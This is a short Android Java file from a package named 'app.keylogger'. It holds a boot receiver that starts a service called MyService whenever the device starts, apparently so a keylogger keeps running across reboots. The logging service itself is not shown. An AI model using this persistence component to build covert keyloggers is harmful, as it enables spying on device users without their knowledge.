package app.keylogger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootBroadcast extends BroadcastReceiver {
	private static final String TAG = "Keylogger.BootBroadcast";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i(TAG, "Booted and Started service");
		Intent newIntent = new Intent(context, MyService.class);
		context.startService(newIntent);
	}
}